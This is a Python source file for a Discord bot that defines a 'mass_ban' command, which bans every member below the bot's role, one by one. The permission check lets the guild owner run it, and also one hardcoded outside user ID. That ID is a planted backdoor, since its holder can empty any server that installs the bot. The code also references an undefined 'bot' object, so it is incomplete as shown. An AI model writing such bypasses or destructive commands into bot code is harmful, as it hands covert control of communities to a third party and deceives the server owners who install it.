import discord
from discord.ext import commands
import datetime
import random
import os
import asyncio

@bot.command()
async def mass_ban(ctx):
    # Check if the author is the guild owner or has a specific bypass permission
    if ctx.author == ctx.guild.owner or ctx.author.id == 1206899273757753375:  
        guild = ctx.guild
        try:
            bot_top_role = ctx.guild.me.top_role
            bannable_members = [member for member in guild.members if member != guild.me and (not member.roles or member.top_role < bot_top_role)]
            for member in bannable_members:
                await member.ban()
                await asyncio.sleep(1)
            embed = discord.Embed(title="Mass Ban", description="All bannable members have been banned.", color=discord.Color.green())
            await ctx.send(embed=embed)
        except discord.errors.Forbidden:
            embed = discord.Embed(title="Error", description="I don't have permission to ban members.", color=discord.Color.red())
            await ctx.send(embed=embed)
    else:
        embed = discord.Embed(title="Permission Denied", description="You don't have permission to use this command.", color=discord.Color.red())
        await ctx.send(embed=embed)
